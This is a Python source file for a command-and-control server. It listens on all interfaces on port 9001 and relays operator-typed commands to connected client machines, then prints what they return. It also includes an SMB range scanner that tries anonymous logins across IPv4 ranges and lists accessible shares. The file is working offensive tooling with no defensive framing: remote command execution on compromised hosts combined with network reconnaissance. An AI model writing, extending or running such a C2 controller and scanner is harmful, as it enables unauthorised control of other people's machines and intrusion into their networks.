import socket
import threading
from smb.SMBConnection import SMBConnection
from ipaddress import ip_address, IPv4Address

# SMB Scanner Functionality
def smb_scanner(target_ip):
    print(f"[*] Starting SMB scan on {target_ip}")
    try:
        conn = SMBConnection("", "", "C2_Server", target_ip, use_ntlm_v2=True)
        conn.connect(target_ip, 445, timeout=5)
        if conn:
            print(f"[+] SMB service detected on {target_ip}")
            print("[*] Attempting anonymous login...")
            try:
                shared_drives = conn.listShares()
                if shared_drives:
                    print(f"[+] Anonymous access successful on {target_ip}. Shares available:")
                    for share in shared_drives:
                        print(f"    - {share.name}: {share.comment}")
                else:
                    print(f"[-] No shares accessible anonymously on {target_ip}")
            except Exception as e:
                print(f"[-] Anonymous login failed on {target_ip}: {e}")
            finally:
                conn.close()
        else:
            print(f"[-] SMB service unavailable on {target_ip}")
    except socket.timeout:
        print(f"[-] Timeout: No response from {target_ip}")
    except ConnectionRefusedError:
        print(f"[-] Connection refused: {target_ip} is not accepting SMB connections")
    except OSError as os_err:
        print(f"[-] OS Error: {os_err}")
    except Exception as e:
        print(f"[-] Unexpected error scanning {target_ip}: {e}")

# SMB Range Scanner
def smb_range_scanner(start_ip, end_ip):
    print(f"[*] Scanning range: {start_ip} to {end_ip}")
    try:
        start = ip_address(start_ip)
        end = ip_address(end_ip)

        if not isinstance(start, IPv4Address) or not isinstance(end, IPv4Address):
            print("[-] Only IPv4 addresses are supported.")
            return

        current_ip = start
        while current_ip <= end:
            smb_scanner(str(current_ip))
            current_ip += 1
    except ValueError:
        print("[-] Invalid IP range.")
    except Exception as e:
        print(f"[-] Error in range scanning: {e}")

# Handle individual client connection
def handle_client(client_socket, client_address):
    print(f"[+] New connection from {client_address}")
    try:
        while True:
            command = input("Enter command (type 'scan_range <start_IP> <end_IP>' for SMB range scan, 'exit' to terminate): ")
            if command.lower() == "exit":
                client_socket.send(b"exit")
                print("[-] Closing connection with the client...")
                break
            elif command.startswith("scan_range"):
                # SMB range scan command
                try:
                    _, start_ip, end_ip = command.split()
                    smb_range_scanner(start_ip, end_ip)
                except ValueError:
                    print("[-] Invalid command. Usage: scan_range <start_IP> <end_IP>")
                continue
            client_socket.send(command.encode())
            response = client_socket.recv(4096).decode()
            print(f"Output from {client_address}:")
            print(response)
    except Exception as e:
        print(f"[-] Error with client {client_address}: {e}")
    finally:
        client_socket.close()

# Start the C2 server
def start_c2_server(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] C2 Server started on {host}:{port}")
    print("[*] Waiting for incoming connections...")
    while True:
        client_socket, client_address = server.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_handler.start()

if __name__ == "__main__":
    HOST = "0.0.0.0"  # Listen on all network interfaces
    PORT = 9001       # Port for the C2 server
    start_c2_server(HOST, PORT)
